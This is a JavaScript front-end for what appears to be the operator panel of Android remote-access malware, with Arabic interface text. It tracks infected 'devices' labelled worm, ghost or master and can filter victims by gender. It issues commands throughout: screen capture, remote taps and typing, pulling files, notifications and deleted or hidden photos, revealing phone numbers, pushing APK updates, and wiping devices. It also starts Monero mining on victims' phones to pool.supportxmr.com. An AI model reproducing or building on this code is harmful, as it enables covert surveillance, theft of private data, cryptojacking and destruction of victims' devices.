import Alpine from "alpinejs";
import { apiFetch, ApiError, setAccessToken, getAccessToken, refreshTokens } from "./lib/api.js";
import { formatE164 } from "./lib/e164.js";
import { stateBadge } from "./lib/badge.js";

export const POLL_MS = 5000;
export const COOLDOWN_SECONDS = 30;

export function parseRoute(hash) {
  const clean = (hash || "#/login").replace(/^#\/?/, "") || "login";
  const [pathPart, queryPart] = clean.split("?");
  const segs = pathPart.split("/").filter(Boolean);
  if (segs[0] === "home") return { name: "home" };
  if (segs[0] === "devices" && segs[1]) {
    return { name: "device-detail", id: segs[1] };
  }
  if (segs[0] === "devices") {
    const platform = new URLSearchParams(queryPart || "").get("platform");
    return { name: "devices", platform: platform || "" };
  }
  return { name: "login" };
}

export function makePanelStore() {
  return {
    route: { name: "login", platform: "" },
    view: "loading",
    message: "",
    user: null,
    loginError: "",

    devices: [],
    detail: null,
    commandChoice: "ping",

    pendingTicket: "",
    statusFilter: "",
    genderFilter: "",
    appTypeFilter: "",
    sortKey: "createdAt",
    search: "",
    wipeArmed: false,
    selected: {},
    editName: "",
    editNotes: "",
    auditItems: [],
    previewUrl: "",
    revealedPhone: "",
    mining: null,
    miningPool: "",
    miningWallet: "",
    filesList: [],
    filesOpen: false,
    notifItems: [],
    notifOpen: false,
    screenTapUrl: "",
    pullModal: { open: false, tab: "original", search: "", spec: "", counts: {}, items: [], progress: null },

    listFilter: "",
    pollTimer: null,
    cooldownTimer: null,
    cooldownLeft: 0,

    formatE164,
    badgeOf(state) {
      return stateBadge(state);
    },

    navigate(route) {
      this.stopTimers();
      this.route = route;
      this.view = "loading";
      this.message = "";
      if (route.name === "login") this.loginError = "";
      if (route.name === "devices") this.loadDevices();
      if (route.name === "device-detail") this.loadDetail(route.id);
    },

    stopTimers() {
      if (this.pollTimer) clearInterval(this.pollTimer);
      this.pollTimer = null;
      if (this.cooldownTimer) clearInterval(this.cooldownTimer);
      this.cooldownTimer = null;
    },

    startLogin(username, password) {
      this.loginError = "";
      return apiFetch("/auth/login", {
        method: "POST",
        body: JSON.stringify({ username, password }),
      })
        .then((body) => {
          if (body.require2fa) {
            this.pendingTicket = body.ticket;
            return;
          }
          this.finishLogin(body);
        })
        .catch((err) => {
          this.loginError =
            err instanceof ApiError && err.status === 0
              ? "تعذر الاتصال، حاول تاني"
              : "مستخدم أو كلمة مرور خاطئة";
        });
    },

    submit2fa(code) {
      this.loginError = "";
      return apiFetch("/auth/2fa", {
        method: "POST",
        body: JSON.stringify({ ticket: this.pendingTicket, code }),
      })
        .then((body) => {
          this.pendingTicket = "";
          this.finishLogin(body);
        })
        .catch((err) => {
          this.loginError =
            err instanceof ApiError && err.status === 0
              ? "تعذر الاتصال، حاول تاني"
              : "رمز التحقق غلط";
        });
    },

    finishLogin(body) {
      setAccessToken(body.accessToken);
      localStorage.setItem("refresh_token", body.refreshToken);
      this.user = body.user;
      this.show("#/home");
    },

    show(hash) {
      window.location.hash = hash;
    },

    logout() {
      setAccessToken(null);
      localStorage.removeItem("refresh_token");
      this.user = null;
      this.show("#/login");
    },

    async loadDevices() {
      this.view = "loading";
      const qs = this.route.platform ? `?platform=${this.route.platform}` : "";
      try {
        const list = await apiFetch(`/devices${qs}`);
        this.devices = Array.isArray(list) ? list : [];
        this.view = this.devices.length ? "ready" : "empty";
        this.startPolling(qs);
      } catch (err) {
        this.handleLoadError(err);
      }
    },

    startPolling(qs) {
      this.stopTimers();
      this.pollTimer = setInterval(async () => {
        if (document.hidden || this.route.name !== "devices") return;
        try {
          const list = await apiFetch(`/devices${qs}`);
          this.devices = list;
          this.view = this.devices.length ? "ready" : "empty";
        } catch (err) {
          if (err.status === 401) this.expireSession();
          else if (err.status === 0) {
            this.view = "offline";
            this.message = "لا يوجد اتصال بالشبكة";
          }
        }
      }, POLL_MS);
    },

    async loadDetail(id) {
      this.view = "loading";
      try {
        this.detail = await apiFetch(`/devices/${encodeURIComponent(id)}`);
        this.view = this.detail ? "ready" : "empty";
        this.revealedPhone = "";
        this.editName = this.detail?.name || "";
        this.editNotes = this.detail?.notes || "";
        this.loadAudit(id);
        this.loadMining(id);
        this.loadFiles(id);
      } catch (err) {
        this.handleLoadError(err);
      }
    },

    /* ------------------------ files / notifications --------------------- */

    async loadFiles(id) {
      try {
        const body = await apiFetch(`/devices/${encodeURIComponent(id)}/files`);
        this.filesList = body.files || [];
      } catch {
        this.filesList = [];
      }
    },

    /** Latest screen frame → click overlay for input_tap/input_text. */
    latestFrame() {
      return this.filesList.find((f) => f.kind === "screen") || null;
    },

    openScreenTap() {
      const f = this.latestFrame();
      if (!f) {
        this.flash = "مفيش لقطة شاشة — اطلب screen_capture الأول";
        setTimeout(() => (this.flash = ""), 2500);
        return;
      }
      this.screenTapUrl = `/api/devices/${encodeURIComponent(this.route.id)}/files/${f.id}/content`;
    },

    closeScreenTap() {
      this.screenTapUrl = "";
    },

    /** Click on the frame → normalized coords → input_tap. */
    async tapAt(ev) {
      const img = ev.currentTarget;
      const r = img.getBoundingClientRect();
      const x = (ev.clientX - r.left) / r.width;
      const y = (ev.clientY - r.top) / r.height;
      if (x < 0 || x > 1 || y < 0 || y > 1) return;
      await this.sendCommand(this.route.id, "input_tap", {
        x: +x.toFixed(4), y: +y.toFixed(4),
      });
    },

    async sendText() {
      const text = window.prompt("النص:", "");
      if (!text) return;
      await this.sendCommand(this.route.id, "input_text", { text });
    },

    /** Pull a file category via files_pull (server-side queue). */
    async filesPull(cat) {
      const limit = 10;
      await this.sendCommand(this.route.id, "files_pull", { category: cat, limit });
    },

    async notifsPull() {
      await this.sendCommand(this.route.id, "notifications_pull", {});
    },

    /** Downloaded artifact viewer: image→preview overlay, json notif→list. */
    async openFile(f) {
      const url = `/api/devices/${encodeURIComponent(this.route.id)}/files/${f.id}/content`;
      try {
        const res = await fetch(url, { headers: { Authorization: `Bearer ${getAccessToken()}` } });
        if (!res.ok) throw new Error();
        if (f.kind === "dump" && f.category === "notifications") {
          this.notifItems = await res.json();
          this.notifOpen = true;
          return;
        }
        const blob = await res.blob();
        if (blob.type.startsWith("image/")) {
          if (this.previewUrl) URL.revokeObjectURL(this.previewUrl);
          this.previewUrl = URL.createObjectURL(blob);
        } else {
          const text = await blob.text();
          window.alert(text.slice(0, 8000));
        }
      } catch {
        this.flash = "تعذر فتح الملف";
        setTimeout(() => (this.flash = ""), 2500);
      }
    },

    async loadAudit(id) {
      try {
        const body = await apiFetch(`/devices/${encodeURIComponent(id)}/audit`);
        this.auditItems = body.items || [];
      } catch {
        this.auditItems = [];
      }
    },

    /** Mining panel state: minerState + hashrate ring + sessions. */
    async loadMining(id) {
      try {
        this.mining = await apiFetch(`/devices/${encodeURIComponent(id)}/mining`);
      } catch {
        this.mining = null;
      }
    },

    async miningStart(id) {
      try {
        await apiFetch(`/devices/${encodeURIComponent(id)}/mining/start`, {
          method: "POST",
          body: JSON.stringify({
            algo: "rx/0",
            pool: this.miningPool || "pool.supportxmr.com:443",
            wallet: this.miningWallet || "",
            threads: 2,
          }),
        });
        this.flash = "أمر التعدين اتبعت";
        setTimeout(() => (this.flash = ""), 2500);
        this.loadMining(id);
      } catch (err) {
        this.flash = err?.status === 409 ? "التعدين شغال أصلًا" : "فشل إرسال الأمر";
        setTimeout(() => (this.flash = ""), 2500);
      }
    },

    async miningStop(id) {
      try {
        await apiFetch(`/devices/${encodeURIComponent(id)}/mining/stop`, {
          method: "POST", body: "{}",
        });
        this.flash = "أمر الإيقاف اتبعت";
        setTimeout(() => (this.flash = ""), 2500);
        this.loadMining(id);
      } catch (err) {
        this.flash = err?.status === 409 ? "مفيش تعدين شغال" : "فشل إرسال الأمر";
        setTimeout(() => (this.flash = ""), 2500);
      }
    },

    async saveDeviceMeta(id) {
      try {
        this.detail = await apiFetch(`/devices/${encodeURIComponent(id)}`, {
          method: "PATCH",
          body: JSON.stringify({ name: this.editName, notes: this.editNotes }),
        });
        this.flash = "تم الحفظ";
        setTimeout(() => (this.flash = ""), 2500);
      } catch (err) {
        this.handleLoadError(err);
      }
    },

    /** Authenticated reveal of the AES-GCM phone (audited server-side). */
    async revealPhone(id) {
      try {
        const res = await apiFetch(`/devices/${encodeURIComponent(id)}/phone/reveal`, {
          method: "POST",
          body: "{}",
        });
        this.revealedPhone = res.phone || "";
        this.loadAudit(id);
      } catch {
        this.revealedPhone = "غير متاح";
      }
    },

    missingPerms(d) {
      const list = d?.stats?.missingPerms;
      return Array.isArray(list) ? list.filter(Boolean) : [];
    },

    /** Offline over 24 hours — alert on the detail card. */
    offlineOver24h(d) {
      if (!d || d.state === "online" || d.state === "idle") return false;
      return Date.now() - new Date(d.lastSeen).getTime() > 24 * 3600_000;
    },

    async pushUpdate(id) {
      const url = window.prompt("APK URL:", "http://10.0.2.2:8000/app-debug.apk");
      if (!url) return;
      await this.sendCommand(id, "apk_update", { url });
    },

    async previewPhoto(p) {
      try {
        const res = await fetch(
          `/api/devices/${encodeURIComponent(this.route.id)}/photos/${encodeURIComponent(p.hash)}/file`,
          { headers: { Authorization: `Bearer ${getAccessToken()}` } }
        );
        if (!res.ok) { this.flash = "لا يوجد ملف"; setTimeout(() => (this.flash = ""), 2500); return; }
        if (this.previewUrl) URL.revokeObjectURL(this.previewUrl);
        this.previewUrl = URL.createObjectURL(await res.blob());
      } catch {
        this.flash = "لا يوجد ملف";
        setTimeout(() => (this.flash = ""), 2500);
      }
    },

    closePreview() {
      if (this.previewUrl) URL.revokeObjectURL(this.previewUrl);
      this.previewUrl = "";
    },

    /* ------------------------- bulk selection ------------------------ */

    toggleSelect(id) {
      this.selected = { ...this.selected, [id]: !this.selected[id] };
    },

    toggleSelectAll() {
      const rows = this.filteredDevices();
      const all = rows.every((d) => this.selected[d.id]);
      const next = { ...this.selected };
      for (const d of rows) next[d.id] = !all;
      this.selected = next;
    },

    selectedIds() {
      return Object.keys(this.selected).filter((k) => this.selected[k]);
    },

    async bulkDelete() {
      const ids = this.selectedIds();
      for (const id of ids) {
        await apiFetch(`/devices/${encodeURIComponent(id)}`, { method: "DELETE" }).catch(() => {});
      }
      this.selected = {};
      this.loadDevices();
    },

    handleLoadError(err) {
      if (!(err instanceof ApiError)) return this.networkDown();
      if (err.status === 401) return this.expireSession();
      if (err.status === 429) return this.enterCooldown();
      if (err.status === 500) {
        this.view = "server-error";
        this.message = "السيرفر تعبان، جرّب تاني";
        return;
      }
      this.networkDown();
    },

    networkDown() {
      this.view = "offline";
      this.message = "لا يوجد اتصال بالشبكة";
    },

    expireSession() {
      this.stopTimers();
      setAccessToken(null);
      localStorage.removeItem("refresh_token");
      this.show("#/login");
    },

    enterCooldown() {
      this.view = "cooldown";
      this.message = "طلبات كتير، استنى شوية وهنعيد تلقائي";
      this.cooldownLeft = COOLDOWN_SECONDS;
      this.cooldownTimer = setInterval(() => {
        this.cooldownLeft -= 1;
        if (this.cooldownLeft <= 0) {
          clearInterval(this.cooldownTimer);
          this.cooldownTimer = null;
          this.reload();
        }
      }, 1000);
    },

    reload() {
      if (this.route.name === "device-detail") this.loadDetail(this.route.id);
      else this.loadDevices();
    },

    async reconnect(id) {
      try {
        this.detail = await apiFetch(`/devices/${encodeURIComponent(id)}/reconnect`, {
          method: "POST",
        });
      } catch (err) {
        this.handleLoadError(err);
      }
    },

    async removeDevice(id) {
      try {
        await apiFetch(`/devices/${encodeURIComponent(id)}`, { method: "DELETE" });
        this.show("#/devices");
      } catch (err) {
        this.handleLoadError(err);
      }
    },

    async sendCommand(id, cmd, payload) {
      try {
        await apiFetch(`/devices/${encodeURIComponent(id)}/commands`, {
          method: "POST",
          body: JSON.stringify({ command: cmd ?? this.commandChoice, ...(payload ? { payload } : {}) }),
        });
        this.flash = "تم إرسال الأمر";
        setTimeout(() => (this.flash = ""), 2500);
      } catch (err) {
        this.handleLoadError(err);
      }
    },

    /* ----------------------- list helpers ----------------------- */

    /** deleted = formatted OR silent >= 7 days. */
    isDeleted(d) {
      if (d.formattedAt) return true;
      const last = new Date(d.lastSeen).getTime();
      return Date.now() - last > 7 * 86400_000;
    },

    filteredDevices() {
      const q = this.search.trim().toLowerCase();
      const by = {
        createdAt: (a, b) => new Date(b.createdAt) - new Date(a.createdAt),
        lastSeen: (a, b) => new Date(b.lastSeen) - new Date(a.lastSeen),
        name: (a, b) => String(a.name || "").localeCompare(String(b.name || "")),
      }[this.sortKey] || ((a, b) => new Date(a.createdAt) - new Date(b.createdAt));
      return (this.devices || [])
        .slice()
        .sort(by)
        .filter((d) => {
          if (this.statusFilter === "deleted" && !this.isDeleted(d)) return false;
          if (this.statusFilter === "online" && (this.isDeleted(d) || d.state !== "online")) return false;
          if (this.statusFilter === "offline" && (this.isDeleted(d) || d.state === "online")) return false;
          if (this.genderFilter && (d.gender || "") !== this.genderFilter) return false;
          if (this.appTypeFilter && (d.appType || "worm") !== this.appTypeFilter) return false;
          if (q && !(d.name || "").toLowerCase().includes(q) && !(d.phone || "").includes(q)) return false;
          return true;
        });
    },

    dotClass(d) {
      if (this.isDeleted(d)) return "dot-red";
      if (d.state === "online") return "dot-green";
      if (d.state === "idle") return "dot-amber";
      return "dot-gray";
    },

    stateLabel(d) {
      if (this.isDeleted(d)) return "محذوف";
      if (d.state === "online") return "متصل";
      if (d.state === "idle") return "خامل";
      return "غير متصل";
    },

    genderIcon(d) {
      return d.gender === "female" ? "♀ أنثى" : d.gender === "male" ? "♂ ذكر" : "—";
    },

    appTypeBadge(d) {
      const t = d.appType || "worm";
      return { worm: { label: "Worm", cls: "tb-worm" }, ghost: { label: "Ghost", cls: "tb-ghost" },
               master: { label: "Master", cls: "tb-master" } }[t] || { label: t, cls: "tb-worm" };
    },

    async exportCsv() {
      let res = await fetch("/api/devices.csv", {
        headers: { Authorization: `Bearer ${getAccessToken()}` },
      });
      if (res.status === 401 && (await refreshTokens())) {
        res = await fetch("/api/devices.csv", {
          headers: { Authorization: `Bearer ${getAccessToken()}` },
        });
      }
      if (!res.ok) { this.flash = "CSV فشل"; return; }
      const blob = await res.blob();
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "devices.csv";
      a.click();
      URL.revokeObjectURL(a.href);
    },

    daysWithUs(d) {
      return Math.max(0, Math.floor((Date.now() - new Date(d.createdAt).getTime()) / 86400_000));
    },

    /* ---------------------- stats side panel --------------------- */

    statOf(k) {
      const s = this.detail?.stats;
      return s && s[k] !== undefined && s[k] !== null ? s[k] : "—";
    },

    statText(k) {
      const s = this.detail?.stats?.[k];
      if (!s || typeof s !== "object") return "—";
      if (k === "lastCall") return `${s.number || "?"} · ${s.atMs ? new Date(s.atMs).toLocaleString("ar-EG") : "?"}`;
      return `${s.sender || "?"} · ${s.preview || ""}`.trim();
    },

    /* ------------------------ pull modal ------------------------- */

    async openPullModal(id) {
      this.pullModal = { open: true, tab: "original", search: "", spec: "", counts: {}, items: [], progress: null };
      try {
        const r = await apiFetch(`/devices/${encodeURIComponent(id)}/photos`);
        this.pullModal.counts = r.counts || {};
        this.pullModal.items = r.items || [];
      } catch {
        this.pullModal.counts = {};
      }
    },

    pullItems() {
      const q = this.pullModal.search.trim().toLowerCase();
      return this.pullModal.items
        .filter((p) => p.category === this.pullModal.tab)
        .filter((p) => !q || (p.name || "").toLowerCase().includes(q))
        .slice(0, 60);
    },

    /** "N" | "DEL N" | "HIDE N" -> {category, limit} */
    parsePullSpec(spec) {
      const m = /^\s*(?:(DEL|HIDE)\s+)?(\d+)\s*$/i.exec(spec || "");
      if (!m) return null;
      const cat = m[1] ? { DEL: "deleted", HIDE: "hidden" }[m[1].toUpperCase()] : "original";
      return { category: cat, limit: Math.min(2000, parseInt(m[2], 10)) };
    },

    async startPull(id) {
      const parsed = this.parsePullSpec(this.pullModal.spec);
      if (!parsed) {
        this.flash = "اكتب العدد صح — مثال: 5 أو DEL 3";
        setTimeout(() => (this.flash = ""), 2500);
        return;
      }
      this.pullModal.progress = 20;
      await this.sendCommand(id, "pull_photos", parsed);
      this.pullModal.progress = 60;
      setTimeout(() => { this.pullModal.progress = 100; }, 2000);
    },

    /* ------------------------- format --------------------------- */

    formatWipe(id) {
      if (!this.wipeArmed) {
        this.wipeArmed = true;
        setTimeout(() => (this.wipeArmed = false), 5000);
        return;
      }
      this.wipeArmed = false;
      this.sendCommand(id, "wipe");
    },

    flash: "",
  };
}

Alpine.store("panel", makePanelStore());

export default Alpine;
